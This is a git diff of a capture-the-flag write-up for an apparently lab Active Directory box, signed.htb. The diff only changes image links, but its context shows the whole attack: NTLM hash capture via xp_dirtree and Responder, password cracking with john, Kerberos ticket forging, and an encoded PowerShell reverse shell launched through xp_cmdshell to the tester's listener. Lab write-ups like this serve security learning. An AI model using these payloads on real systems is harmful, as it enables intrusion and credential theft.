@@ -72,9 +72,9 @@ Host script results:
 ```
 impacket-mssqlclient scott@dc01.signed.htb
 ```
-![[Pasted image 20251213171408.png]]
+![Pasted image 20251213171408](../Attachments/Pasted20image%2020251213171408.png)
 - I can use xpdirtree so I grabbed the hash from my responder.
-![[Pasted image 20251213184314.png]]
+![Pasted image 20251213184314](../Attachments/Pasted20image%2020251213184314.png)
 ```
 xp_dirtree "\\10.10.14.21\test"
 
@@ -86,7 +86,7 @@ sudo responder -I tun0
 ---RELEVANT-OUTPUT---
 [SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:2e6fec3ec5f01a6f:F6B539048A8ABC91FC04767F7EA8D394:010100000000000080C4868C536CDC0170BEAB55FB5955EC0000000002000800330030003600570001001E00570049004E002D005900500043005200510039004A0041004C0054005A0004003400570049004E002D005900500043005200510039004A0041004C0054005A002E0033003000360057002E004C004F00430041004C000300140033003000360057002E004C004F00430041004C000500140033003000360057002E004C004F00430041004C000700080080C4868C536CDC0106000400020000000800300030000000000000000000000000300000B0260833AEE1AA47F8BAC866B4BC4C8DC63B7266E36F094D086D56DC3E32E42D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320031000000000000000000
 ```
-![[Pasted image 20251213184400.png]]
+![Pasted image 20251213184400](../Attachments/Pasted20image%2020251213184400.png)
 
 - I can crack it with john
 ```
@@ -102,13 +102,13 @@ purPLE9795!@     (mssqlsvc)
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
 Session completed.
 ```
-![[Pasted image 20251213184500.png]]
+![Pasted image 20251213184500](../Attachments/Pasted20image%2020251213184500.png)
 
 - I can login to mssql with these credentials:
 ```
 impacket-mssqlclient mssqlsvc@dc01.signed.htb -windows-auth
 ```
-![[Pasted image 20251213192038.png]]
+![Pasted image 20251213192038](../Attachments/Pasted20image%2020251213192038.png)
 - Still can't pass xp_cmdshell
 - First I need to convert the cracked password to NT hash format:
 ```
@@ -117,7 +117,7 @@ echo -n 'purPLE9795!@' | iconv -t utf-16le | openssl md4
 ---OUTPUT---
 MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc
 ```
-![[Pasted image 20251213184653.png]]
+![Pasted image 20251213184653](../Attachments/Pasted20image%2020251213184653.png)
 
 - Next we need the RID of the and the domain SID of mssqlsvc
 ```
@@ -232,11 +232,11 @@ EXECUTE sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
 EXECUTE xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAxACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
 ```
-![[Pasted image 20251213194232.png]]
+![Pasted image 20251213194232](../Attachments/Pasted20image%2020251213194232.png)
 - I grab a shell on my listener:
-![[Pasted image 20251213194254.png]]
+![Pasted image 20251213194254](../Attachments/Pasted20image%2020251213194254.png)
 - I grab the user flag:
-![[Pasted image 20251213194323.png]]
+![Pasted image 20251213194323](../Attachments/Pasted20image%2020251213194323.png)
 
 - To get root flag, looking back at my mysql login, I check if I am admin in sql (due to the forged kerberos ticket):
 ```
@@ -255,7 +255,7 @@ BulkColumn
 ---------------------------------------   
 b'6124b4723c61cb4ad51a2aecef3602af\r\n'
 ```
-![[Pasted image 20251213210344.png]]
+![Pasted image 20251213210344](../Attachments/Pasted20image%2020251213210344.png)
 - I decode it via python to grab the root flag:
 ```
 python3 -c "print(b'6124b4723c61cb4ad51a2aecef3602af\r\n'.decode())"
@@ -263,7 +263,7 @@ python3 -c "print(b'6124b4723c61cb4ad51a2aecef3602af\r\n'.decode())"
 ---OUTPUT---
 6124b4723c61cb4ad51a2aecef3602af
 ```
-![[Pasted image 20251213210313.png]]
+![Pasted image 20251213210313](../Attachments/Pasted20image%2020251213210313.png)
 
 - By using ticketer we forge our ticket by adding 512 which is the id for domain admin group, Then using this ticket to authenticate to sql gives us sysadmin privileges in sql. but if we pass xp_cmdshell is still executes under the context of mssqlsvc which allows us only to get root.
 - However, due the fact that we are sysadmin, we can pass OPENROWSET command, which executes under the context of SQL Server service which is like an admin and can read the root flag. The output is in python bytes which we can decode to grab the root flag.
